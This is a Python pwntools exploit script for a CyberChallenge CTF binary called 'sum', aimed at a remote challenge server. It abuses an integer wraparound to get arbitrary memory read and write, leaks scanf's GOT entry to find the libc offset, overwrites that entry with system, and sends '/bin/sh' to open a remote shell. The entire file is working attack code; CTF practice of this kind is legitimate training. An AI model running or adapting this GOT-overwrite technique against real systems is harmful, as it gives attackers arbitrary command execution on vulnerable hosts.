from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/Sum/sum")
context.binary = exe
HOST = "sum.challs.cyberchallenge.it"
PORT = 6014
p = remote(HOST, PORT)

print("\n[+] Exploiting...")
abs_scanf = 0x0017c4e0  # absolute address of scanf function
abs_system = 0x0014f440  # absolute address of system function
scanf_got = 787465  # address of function scanf in the GOT (Global Offset Table)

p.sendline(b"-1")  # Trigger the error to generate 18446744073709551615 values
p.recvuntil(">")
p.clean()
p.sendline(b"get " + str(scanf_got).encode())  # send the GOT address of function scanf

rel_scanf = int(p.recvline()[:-1])  # used to get the relative address on the server
print("[+] Relative scanf -->  " + hex(rel_scanf))

offset = rel_scanf - abs_scanf  # I subtract the address for the absolute address to find the offset
print("[+] Offset -->  " + hex(offset))

rel_system = offset + abs_system  # I add the offset to the absolute address of the system function to find the relative system address
print("[+] Relative system -->  " + hex(rel_system))

# change the GOT address of scanf with relative address of system
p.sendline(b"set " + str(scanf_got).encode() + b" " + str(rel_system).encode())

p.sendline(b"/bin/sh")
p.interactive()
